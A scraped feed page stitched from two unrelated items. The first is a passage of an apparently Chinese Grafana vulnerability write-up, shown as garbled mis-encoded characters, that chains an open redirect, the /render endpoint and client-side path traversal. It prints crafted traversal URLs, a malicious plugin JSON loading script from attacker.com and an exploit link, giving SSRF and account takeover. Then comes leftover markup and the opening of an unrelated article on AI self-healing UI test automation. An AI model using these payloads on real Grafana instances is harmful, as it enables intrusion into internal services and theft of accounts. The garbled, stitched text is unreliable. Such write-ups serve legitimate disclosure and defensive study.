<p>é‚£ä¸ªå¼€æ”¾é‡å®šå‘æœ¬èº«å¹¶æ²¡æœ‰ä¸¥é‡çš„å®‰å…¨å½±å“ï¼Œæ‰€ä»¥æˆ‘éœ€è¦å°†å…¶ä¸å¦ä¸€ä¸ªåŠŸèƒ½é“¾æ¥èµ·æ¥ã€‚</p>
<p>Grafanaæœ‰ä¸€ä¸ªåä¸º <code>/render</code> çš„ç«¯ç‚¹ï¼Œç”¨äºæ ¹æ®æä¾›çš„è·¯å¾„ç”Ÿæˆå›¾åƒã€‚</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// æ¸²æŸ“</span>
<span class="hljs-selector-tag">r</span><span class="hljs-selector-class">.Get</span>(<span class="hljs-string">"/render/*"</span>, requestmeta.<span class="hljs-built_in">SetSLOGroup</span>(requestmeta.SLOGroupHighSlow), reqSignedIn, hs.RenderHandler)
</code></pre>
<p>æ­¤ç«¯ç‚¹ä½¿ç”¨æ— å¤´æµè§ˆå™¨æ¥æ¸²æŸ“ç”¨æˆ·æŒ‡å®šçš„è·¯ç”±çš„HTMLï¼Œå®ƒåªæ¥å—ç›¸å¯¹URLè·¯å¾„ <code>/route</code>ï¼Œä¸å…è®¸ä»ç»å¯¹URL <code>https://....</code> æ¸²æŸ“å†…å®¹ã€‚</p>
<p>ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä½¿ç”¨æˆ‘å‘ç°çš„å¼€æ”¾é‡å®šå‘æ¥é‡å®šå‘åˆ°å†…éƒ¨æœåŠ¡å‘¢ï¼Ÿ</p>
<p>é¦–å…ˆï¼Œæˆ‘å°è¯•åŠ è½½ <code>google.es</code> ä½¿ç”¨ <code>/render/public/..%252f%255Cgoogle.es%252f%253F%252f..%252f..</code></p>
<p>ç„¶åæˆ‘è®¾ç½®äº†ä¸€ä¸ªå¤–éƒ¨æ— æ³•è®¿é—®çš„å†…éƒ¨æœåŠ¡ã€‚</p>
<p>æˆ‘å°è¯•åŠ è½½ <code>127.0.0.1:1234</code> ä½¿ç”¨ <code>/render/public/..%252f%255C127.0.0.1:1234%252f%253F%252f..%252f..</code></p>
<p>åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œæˆ‘èƒ½å¤Ÿå®Œå…¨è¯»å–å†…éƒ¨æœåŠ¡ã€‚ç”±äºä½¿ç”¨äº†æµè§ˆå™¨è¿›è¡Œæ¸²æŸ“ï¼Œæˆ‘ç”šè‡³å¯ä»¥é€šè¿‡åˆ¶ä½œä¸€ä¸ªé’ˆå¯¹å†…éƒ¨æœåŠ¡çš„è¡¨å•æ¥å‘é€ <code>POST</code> è¯·æ±‚ã€‚</p>
<p>Grafanaåœ¨Intigritiä¸Šçš„å…¬å¼€æ¼æ´èµé‡‘è®¡åˆ’ä¸åŒ…æ‹¬ <code>/render</code> ç«¯ç‚¹ï¼Œå› ä¸ºå®ƒé»˜è®¤æœªå¯ç”¨ã€‚æ­¤å¤–ï¼Œè¿™ä¸ªæ¼æ´éœ€è¦ç™»å½•ï¼Œæ‰€ä»¥æˆ‘æ— æ³•ä»ä¸­è·å¾—ä»»ä½•å¥½å¤„ã€‚</p>
<h4 data-id="heading-7">é€šè¿‡XSSè¿›è¡Œè´¦æˆ·æ¥ç®¡</h4>
<p>è¿™å¯èƒ½æ˜¯æˆ‘ä¸ºå®ç°XSSå’Œè´¦æˆ·æ¥ç®¡æ‰€åˆ©ç”¨è¿‡çš„æœ€å¥½çš„æ¼æ´é“¾ã€‚</p>
<p><strong>å®¢æˆ·ç«¯è·¯å¾„éå†</strong></p>
<p>Grafanaå®¢æˆ·ç«¯ä»£ç çš„ä¸€ä¸ªé‡è¦éƒ¨åˆ†å…è®¸å®¢æˆ·ç«¯è·¯å¾„éå†ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå½“ä½ åœ¨æµè§ˆå™¨ä¸­åŠ è½½ <code>/invite/1</code> æ—¶ï¼ŒJavaScriptä¼šå‘ <code>/api/user/invite/1</code> å‘å‡ºè¯·æ±‚ä»¥è·å–é‚€è¯·ä¿¡æ¯ã€‚</p>
<p>ä½†æ˜¯ï¼Œå¦‚æœä½ åŠ è½½ <code>/invite/..%2f..%2f..%2f..%2froute</code>ï¼ŒJavaScriptä¼šè§£æè·¯å¾„éå†å¹¶æœ€ç»ˆåŠ è½½ <code>/route</code>ã€‚</p>
<p>è¿™åˆ›å»ºäº†ä¸€ä¸ªå®Œç¾çš„åœºæ™¯ï¼Œå¯ä»¥å¼ºåˆ¶JavaScriptåŠ è½½å¼€æ”¾é‡å®šå‘ï¼Œè¿›è€Œä»æˆ‘çš„æœåŠ¡å™¨è·å–ä¸€ä¸ªç‰¹åˆ¶çš„JSONã€‚</p>
<p>ä½†é¦–å…ˆï¼Œæˆ‘éœ€è¦æ‰¾åˆ°ä¸€ä¸ªä»¥ä¸å®‰å…¨æ–¹å¼åŠ è½½å†…å®¹çš„ç«¯ç‚¹ï¼Œå¹¶åˆ©ç”¨å®ƒæ¥æ‰§è¡ŒJavaScriptã€‚</p>
<p><strong>åŠ è½½æ¶æ„JavaScriptæ–‡ä»¶</strong></p>
<p>ä½ å¯ä»¥ä½¿ç”¨ <code>/a/plugin-app/explore</code> æ¥åŠ è½½å’Œç®¡ç†æ’ä»¶åº”ç”¨ã€‚</p>
<p>æ­¤åŠŸèƒ½çš„JavaScriptä»URLä¸­æå–æ’ä»¶åº”ç”¨åç§°ï¼Œå¹¶ç”¨å®ƒå‘ <code>/api/plugins/plugin-app/settings</code> è¯·æ±‚æ’ä»¶ä¿¡æ¯ã€‚</p>
<p><code>/api/plugins/plugin-app/settings</code> æ–‡ä»¶çœ‹èµ·æ¥åƒè¿™æ ·ã€‚</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"plugin-app"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"app"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"plugin-app"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"pinned"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"autoEnabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"module"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"/modules/..../plugin-app.js"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// è¦åŠ è½½çš„jsæ–‡ä»¶</span>
  <span class="hljs-attr">"baseUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"public/plugins/grafana-lokiexplore-app"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"info"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"author"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"Grafana"</span>
      ...
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
  ...
<span class="hljs-punctuation">}</span>
</code></pre>
<p><code>/a/plugin-app/explore</code> åŠ è½½è¯¥æ–‡ä»¶ï¼Œå¹¶æ‰§è¡Œ <code>"module"</code> å‚æ•°ä¸­æä¾›çš„JavaScriptã€‚</p>
<p><code>/a/plugin-app/explore</code> å­˜åœ¨å®¢æˆ·ç«¯è·¯å¾„éå†æ¼æ´ï¼Œè¿™å…è®¸æˆ‘åŠ è½½æœåŠ¡å™¨ä¸Šçš„ä»»ä½•è·¯ç”±ï¼Œè€Œä¸æ˜¯ <code>/api/plugin-app/settings</code>ã€‚</p>
<p>è¿™è®©æˆ‘å¯ä»¥åŠ è½½å¼€æ”¾é‡å®šå‘ï¼Œä»è€Œè·å–æˆ‘è‡ªå·±çš„æ¶æ„JSONï¼Œå…¶ä¸­åŒ…å«æˆ‘æƒ³è¦çš„ä»»ä½•JavaScriptæ–‡ä»¶ã€‚</p>
<p>æ‰€ä»¥ï¼ŒåŸºæœ¬ä¸Šï¼Œæˆ‘è®¾ç½®äº†è‡ªå·±çš„æœåŠ¡å™¨ï¼ŒåŒ…å«æ‰€æœ‰å¿…è¦çš„JSå’ŒJSONæ–‡ä»¶ã€‚æˆ‘åªéœ€è¦æ‰˜ç®¡ä¸€ä¸ªåƒè¿™æ ·çš„JSONï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ExploitPluginReq"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"type"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"app"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"grafana-lokiexplore-app"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"enabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"pinned"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"autoEnabled"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"module"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http://attacker.com/file?js=file"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// æ¶æ„jsæ–‡ä»¶</span>
  <span class="hljs-attr">"baseUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"public/plugins/grafana-lokiexplore-app"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"info"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"author"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      ...
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
  ...
<span class="hljs-punctuation">}</span>
</code></pre>
<p>å¹¶åŠ è½½è¿™ä¸ªè·¯ç”±ï¼š<code>/a/..%2f..%2f..%2fpublic%2f..%252f%255Cattacker.com%252f%253Fp%252f..%252f..%23/explore</code>ï¼Œå®ƒåˆ©ç”¨äº†å®¢æˆ·ç«¯è·¯å¾„éå†å’Œå¼€æ”¾é‡å®šå‘ã€‚</p>
<p>ç»“æœï¼š</p>
<p>æˆ‘çš„æ¶æ„JavaScriptæ–‡ä»¶è¢«æ‰§è¡Œï¼Œå…è®¸æˆ‘æ›´æ”¹å—å®³è€…çš„ç”µå­é‚®ä»¶å¹¶é‡ç½®ä»–ä»¬çš„å¯†ç ã€‚</p>
<h4 data-id="heading-8">å®Œæ•´æ¼æ´åˆ©ç”¨</h4>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FNightBloodz%2FCVE-2025-4123" target="_blank" title="https://github.com/NightBloodz/CVE-2025-4123" ref="nofollow noopener noreferrer">github.com/NightBloodzâ€¦</a></p>
<p>æˆ‘ä¸€ç›´è®¤ä¸ºGrafanaæ˜¯ä¸€ä¸ªä¸å¯èƒ½è¢«å…¥ä¾µçš„ç›®æ ‡ã€‚å®ƒçœ‹èµ·æ¥å¦‚æ­¤å¤æ‚å’Œå®‰å…¨â€”â€”å…¬å¹³åœ°è¯´ï¼Œå®ƒç¡®å®å¦‚æ­¤ã€‚</p>
<p>ä½†å‘ç°è¿™ä¸ªæ¼æ´è¯æ˜ï¼Œæ— è®ºä¸€ä¸ªåº”ç”¨ç¨‹åºçœ‹èµ·æ¥å¤šä¹ˆå®‰å…¨ï¼Œå®ƒæ€»æ˜¯æœ‰æˆ–è€…æœ€ç»ˆä¼šæœ‰æ¼æ´ã€‚</p>
<p>æˆ‘æ— æ³•é€šè¿‡å‘å¤šä¸ªæ¼æ´èµé‡‘è®¡åˆ’æŠ¥å‘Šæ¥è¿›ä¸€æ­¥å‡çº§è¿™ä¸ªæ¼æ´ï¼Œå› ä¸ºè¿™ä¸¤ä¸ªåˆ©ç”¨è·¯å¾„éƒ½éœ€è¦è®¤è¯ã€‚FINISHED
CSD0tFqvECLokhw9aBeRqvKIIiRnkL9yIza9szHEGEsgJQ2u/pg4kqWzexgckcGuCZ4G+G/isppsz+vpquPYF9IWRUby7c15zOEBYpQSS2FBudsxgaVCbpDSoPJQROt4Wjd1DExefN9AONM7bYep3g==</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[è´§æ‹‰æ‹‰UIè‡ªåŠ¨åŒ–æ–°èŒƒå¼ï¼šä»äººå·¥ç»´æŠ¤åˆ°AIè‡ªæ„ˆ]]></title>    <link>https://juejin.cn/post/7602472997921505280</link>    <guid>https://juejin.cn/post/7602472997921505280</guid>    <pubDate>2026-02-04T01:58:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602472997921505280" data-draft-id="7602146335216615464" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="è´§æ‹‰æ‹‰UIè‡ªåŠ¨åŒ–æ–°èŒƒå¼ï¼šä»äººå·¥ç»´æŠ¤åˆ°AIè‡ªæ„ˆ"/> <meta itemprop="keywords" content="æµ‹è¯•"/> <meta itemprop="datePublished" content="2026-02-04T01:58:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è´§æ‹‰æ‹‰æŠ€æœ¯"/> <meta itemprop="url" content="https://juejin.cn/user/1768489241815070"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            è´§æ‹‰æ‹‰UIè‡ªåŠ¨åŒ–æ–°èŒƒå¼ï¼šä»äººå·¥ç»´æŠ¤åˆ°AIè‡ªæ„ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1768489241815070/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è´§æ‹‰æ‹‰æŠ€æœ¯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T01:58:31.000Z" title="Wed Feb 04 2026 01:58:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ä½œè€…ä»‹ç»ï¼šèƒ¡å˜‰æ¤¿ï¼Œæ¥è‡ªè´§æ‹‰æ‹‰/æŠ€æœ¯ä¸­å¿ƒ/è´¨é‡ä¿éšœéƒ¨ï¼Œä¸“æ³¨äºç§»åŠ¨æµ‹è¯•æ•ˆèƒ½æ–¹å‘ã€‚</p>
</blockquote>
<h2 data-id="heading-0">ä¸€ã€èƒŒæ™¯ä¸æŒ‘æˆ˜</h2>
<p>åœ¨ç§»åŠ¨ç«¯æµ‹è¯•ä¸­ï¼Œæˆ‘ä»¬å§‹ç»ˆé¢å¯¹ç€åŒä¸€ä¸ªæ ¸å¿ƒæŒ‘æˆ˜ï¼š<strong>å¦‚ä½•æŒç»­é™ä½æ‰‹å·¥æµ‹è¯•çš„å·¥ä½œé‡ï¼Ÿ</strong> ä¸ºæ­¤ï¼Œæˆ‘ä»¬å›¢é˜Ÿå·²ç»å»ºç«‹èµ·ä¸¤æ¡æˆç†Ÿçš„åˆ›æ–°ææ•ˆè·¯å¾„ï¼š</p>
<ol>
<li><strong>åœ¨è€åŠŸèƒ½å›å½’æµ‹è¯•ä¸Š</strong>ï¼Œæˆ‘ä»¬ä»¥<strong>UIå½•åˆ¶å›æ”¾ï¼ˆå‚è€ƒã€Š</strong> <strong><a href="https://juejin.cn/post/7306331307477794867" target="_blank" title="https://juejin.cn/post/7306331307477794867">è´§æ‹‰æ‹‰Appå½•åˆ¶å›æ”¾çš„æ¢ç´¢ä¸å®è·µ</a></strong> <strong>ã€‹ï¼‰</strong> æŠ€æœ¯ï¼Œé¢ è¦†äº†ä¼ ç»Ÿæ‰‹å†™è„šæœ¬æ¨¡å¼ï¼Œå®ç°äº†è„šæœ¬çš„â€œ<strong>é›¶ä»£ç â€</strong> ç”Ÿæˆä¸å¤§è§„æ¨¡è¦†ç›–ï¼Œä»æ ¹æœ¬ä¸Šè§£å†³äº†è‡ªåŠ¨åŒ–æ™®åŠçš„ç“¶é¢ˆã€‚</li>
<li><strong>åœ¨æ–°åŠŸèƒ½æµ‹è¯•ä¸Š</strong>ï¼Œæˆ‘ä»¬æ¨å‡ºäº†<strong>å¤šæœºåŒæ­¥æ¨¡å¼ï¼ˆå‚è€ƒã€Š</strong> <strong><a href="https://juejin.cn/post/7430902939316109312" target="_blank" title="https://juejin.cn/post/7430902939316109312">è´§æ‹‰æ‹‰äº‘çœŸæœºå¤šæœºåŒæ­¥æ¢ç´¢ä¸å®è·µ</a></strong> <strong>ã€‹ï¼‰</strong> ï¼Œç»•å¼€äº†ä¼ ç»Ÿè„šæœ¬çš„å±€é™ï¼Œå®ç°äº†â€œä¸€ç«¯æ“ä½œã€å¤šç«¯è¦†ç›–â€ï¼Œç¼“è§£äº†å¤šæœºå‹ã€å¤šç«¯å£çš„æ•ˆç‡ç“¶é¢ˆé—®é¢˜ã€‚</li>
</ol>
<p>åŸºäºè¿™äº›åˆ›æ–°å®è·µï¼Œä¸ºæˆ‘ä»¬æ„å»ºäº†è´§æ‹‰æ‹‰ç§»åŠ¨ç«¯æµ‹è¯•çš„ææ•ˆä½“ç³»ã€‚ç„¶è€Œï¼Œæ•ˆç‡æå‡çš„çº¢åˆ©æ­£é€æ¸è§¦è¾¾ç“¶é¢ˆï¼Œè€Œä¸”ä¹Ÿæœ‰æ–°çš„æŒ‘æˆ˜ï¼š</p>
<ul>
<li><strong>è‡ªåŠ¨åŒ–æµ‹è¯•ï¼Œä»éœ€è¦â€œäººå·¥ç»´æŠ¤â€</strong> ï¼šéšç€è„šæœ¬è§„æ¨¡è¶…è¿‡18,000æ¡ï¼ŒApp UIé¢‘ç¹è¿­ä»£å¸¦æ¥çš„è„šæœ¬å¤±æ•ˆé—®é¢˜ï¼Œä½¿æˆ‘ä»¬é™·å…¥äº†æ–°çš„â€œè„šæœ¬ä¿®å¤â€å¾ªç¯ã€‚</li>
<li><strong>æ–°åŠŸèƒ½ï¼Œä»æ˜¯â€œäººå·¥é©±åŠ¨â€</strong> ï¼šå¤šæœºåŒæ­¥æœ¬è´¨ä¸Šæ˜¯å°† N æ¬¡åœ¨æ‰‹æœºä¸Šçš„æ“ä½œå˜æˆ 1 æ¬¡ï¼Œæµ‹è¯•æ‰§è¡Œæœ¬èº«ä¾ç„¶éœ€è¦ä¾èµ–äººå·¥ã€‚</li>
</ul>
<p>å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä»ä¸Šè¿°ä¸¤ä¸ªæ–¹å‘ä¸Šå¯»æ±‚çªç ´ï¼Œæ‰“é€šâ€œæœ€åä¸€å…¬é‡Œâ€çš„éšœç¢ï¼ŒçœŸæ­£å®ç°æµ‹è¯•ææ•ˆçš„é—­ç¯ã€‚é’ˆå¯¹æ–°åŠŸèƒ½æµ‹è¯•ä»ä¾èµ–â€œäººå·¥é©±åŠ¨â€çš„ç“¶é¢ˆï¼Œæˆ‘ä»¬å›¢é˜Ÿå·²åœ¨ç§¯ææ¢ç´¢ç›¸å…³è§£å†³æ–¹æ¡ˆï¼Œå¹¶è®¡åˆ’åœ¨åç»­è¿›è¡Œåˆ†äº«ï¼›æœ¬æ–‡åˆ™å°†èšç„¦äº UI è‡ªåŠ¨åŒ–æµ‹è¯•å®è·µä¸­çš„ç¨³å®šæ€§å’Œæ•ˆèƒ½ç“¶é¢ˆï¼Œæ·±å…¥æ¢è®¨å…¶æŒ‘æˆ˜ä¸å®è·µè·¯å¾„ã€‚</p>
<h2 data-id="heading-1">äºŒã€UIè‡ªåŠ¨åŒ–çš„å±€é™æ€§</h2>
<p>æˆ‘ä»¬é€šè¿‡åˆ†æUIè‡ªåŠ¨åŒ–æµ‹è¯•çš„å†å²æŠ¥å‘Šä¸è„šæœ¬ç»´æŠ¤äººå‘˜çš„å®é™…ç—›ç‚¹ï¼Œå‘ç°ä¸¤å¤§æ ¸å¿ƒå›°å¢ƒæ­£åå™¬ç€æµ‹è¯•æ•ˆèƒ½ï¼š</p>
<ul>
<li><strong>è„šæœ¬ç»´æŠ¤çš„â€œå¾ªç¯â€å›°å¢ƒ</strong> ä¼ ç»Ÿ UI è„šæœ¬é«˜åº¦ä¾èµ–å…ƒç´ å®šä½ç­–ç•¥ï¼ˆå¦‚ ID ã€å›¾åƒæˆ–æ–‡æœ¬åŒ¹é…ï¼‰ï¼Œåœ¨è´§æ‹‰æ‹‰å•å‘¨è¿­ä»£App çš„å†²å‡»ä¸‹å¸¦æ¥çš„UIå¾®è°ƒï¼Œæ¯å‘¨éƒ½æœ‰ä¸å°‘çš„è„šæœ¬é™·å…¥â€œæŠ¢æ•‘å¼â€ä¿®å¤ã€‚</li>
<li><strong>æ‰§è¡Œç¨³å®šæ€§çš„ç“¶é¢ˆ</strong> é¢å¯¹å“ç‰Œç¢ç‰‡åŒ–å¸¦æ¥çš„å„ç±»å¼¹çª—â€œçªè¢­â€ï¼ˆå¦‚ç³»ç»Ÿæ¨é€ã€æƒé™ç”³è¯·ã€Appå¹¿å‘Šç­‰ï¼‰ï¼Œè‡ªåŠ¨åŒ–è„šæœ¬çš„å¹³å‡é€šè¿‡ç‡é•¿æœŸå¾˜å¾Šåœ¨80%çš„ç“¶é¢ˆçº¿ä¸Šï¼›ä¸ºä¿éšœç¨³å®šæ€§ï¼Œéœ€è¦æŒç»­åœ¨è„šæœ¬ä¸­å åŠ å„ç±»å¼¹çª—è¯†åˆ«ä¸å¤„ç†é€»è¾‘ï¼Œè¿›ä¸€æ­¥æ‹‰é«˜ç»´æŠ¤æˆæœ¬ã€‚</li>
</ul>
<p>è¿™ä¸¤å¤§å›°å¢ƒå¦‚åŒä¸€ä¸ªæ°¸è¿œå¡«ä¸æ»¡çš„æ²™æ¼ï¼Œä¸æ–­çš„åœ¨èš•é£Ÿå®è´µçš„æµ‹è¯•èµ„æºã€‚</p>
<h2 data-id="heading-2">ä¸‰ã€AIä»‹å…¥UIè‡ªåŠ¨åŒ–</h2>
<p>ä¼ ç»ŸUIè‡ªåŠ¨åŒ–æµ‹è¯•å…ƒç´ å®šä½ç­–ç•¥æš´éœ²å‡ºä¸¥é‡çš„è„†å¼±æ€§å’Œç»´æŠ¤æˆæœ¬ï¼Œæˆ‘ä»¬é€šè¿‡åœ¨æµ‹è¯•æ‰§è¡Œè¿‡ç¨‹ä¸­å¼•å…¥<strong>AI</strong> <strong>è‡ªæ„ˆèƒ½åŠ›ï¼ˆå¤šæ¨¡æ€ç‰¹å¾èåˆ+è§†è§‰æ¨¡å‹+è¯­ä¹‰åˆ†æèƒ½åŠ›ï¼‰ï¼Œ</strong> ä¸ºUIè„šæœ¬æå‡é²æ£’æ€§ã€‚AIä»‹å…¥æ—¶æœºå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>
